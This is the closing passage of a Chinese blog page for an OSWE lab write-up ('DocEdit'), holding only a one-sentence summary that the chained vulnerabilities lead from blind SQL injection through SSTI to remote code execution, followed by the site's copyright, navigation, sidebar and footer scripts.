+<p><img src="/2021/06/25/OSWE-Lab-DocEdit-Writeup/docedit8.png" alt="docedit8"></p>
+<p>把所有漏洞利用过程串联起来，就可以完成从<code>Like Blind SQL Injection</code>到<code>SSTI</code>导致<code>RCE</code>的整个过程了。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>n0maj1o24
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/" title="OSWE Lab DocEdit Writeup">https://n0maj1o24.github.io/2021/06/25/OSWE-Lab-DocEdit-Writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/OSWE/" rel="tag"># OSWE</a>
+              <a href="/tags/NodeJS/" rel="tag"># NodeJS</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/06/25/OSWE-Lab-Answers-Writeup/" rel="prev" title="OSWE Lab Answers Writeup">
+      <i class="fa fa-chevron-left"></i> OSWE Lab Answers Writeup
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="n0maj1o24"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">n0maj1o24</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/n0maj1o24" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;n0maj1o24" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">n0maj1o24</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'YxcX5Cznyp28BYsOhkgW4VH2-gzGzoHsz',
+      appKey     : 'DNYhYDu0OfL5c9gaMjQ1vbNC',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
